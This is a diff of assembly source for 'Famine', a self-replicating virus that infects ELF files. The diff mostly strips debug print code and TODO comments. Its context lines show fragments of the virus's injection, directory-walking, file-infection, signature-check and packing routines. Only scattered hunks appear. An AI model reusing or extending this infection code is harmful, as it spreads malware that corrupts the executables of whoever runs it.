@@ -25,42 +25,6 @@ _params:
 
 _start:
 	call _inject; push addr to stack
-%ifdef DEBUG; ==================================================================
-	db `....FAMINE....`, 0x0
-
-newline db `\n`, 0x0
-
-_print:; (string rdi)
-	push r11
-	push rdx
-	push rsi
-
-	call _ft_strlen; ft_strlen(rdi)
-	push rdi; mov rsi, rdi
-	pop rsi
-	push rax
-	pop rdx
-	push 1; mov rax, 1
-	pop rax; write
-	push 1; mov rdi, 1
-	pop rdi
-	syscall
-
-	push rsi
-	lea rsi, [rel newline]
-	push 1
-	pop rax; write
-	push 1
-	pop rdx
-	syscall
-	pop rdi
-
-	pop rsi
-	pop rdx
-	pop r11
-ret
-
-%endif; ========================================================================
 
 signature db `Famine version 1.0 (c)oded by lmartin`, 0x0; sw4g signature
 
@@ -68,17 +32,6 @@ _inject:
 	pop r8; pop addr from stack
 	sub r8, 0x5; sub call instr
 	; r8 contains the entry of the virus
-; = DEBUG
-;			mov rdi, r8
-;			mov rax, 11
-;			syscall
-; =
-
-	%ifdef DEBUG
-		mov rdi, r8
-		add rdi, 0x5; sub call instr
-		call _print; _print(rdi)
-	%endif
 
 	; copy the prg in memory and launch it
 	xor rax, rax; = 0
@@ -290,10 +243,6 @@ _move_through_dir:; (string rdi, int rsi); rsi -> 1 => process, -> 0 => infect
 	push rcx
 	push rdx
 
-	%ifdef DEBUG
-		call _print; _print(rdi)
-	%endif
-
 	push rsi
 	pop r13
 
@@ -468,9 +417,6 @@ _infect_file: ; (string rdi, stat rsi)
 
 	push rsi
 	pop r12
-	%ifdef DEBUG
-		call _print; _print(rdi)
-	%endif
 	push 2
 	pop rax; open
 	push 0o0000002; O_RDWR
@@ -541,9 +487,6 @@ _infect_file: ; (string rdi, stat rsi)
 			jmp .find_segment_exec
 		.check_if_infected:
 			lea rdi, [rel signature]
-			%ifdef DEBUG
-				call _print; _print(rdi)
-			%endif
 			call _ft_strlen
 			push rax
 			pop rcx
@@ -1008,11 +951,9 @@ _pack: ;(void *rdi) -> ret size + fill rdi
 		mov rax, r10
 		sub rax, r12
 		mov byte[rdi + r8], al; addr[l] = dictionary - prev_ret
-; == TODO: test
 		inc r8; l++
 		mov rax, rbx
 		mov byte[rdi + r8], al; addr[l] = k
-; == TODO: test
 		inc r8; l++
 		jmp .next_loop; }
 		.not_compress_char:; else {
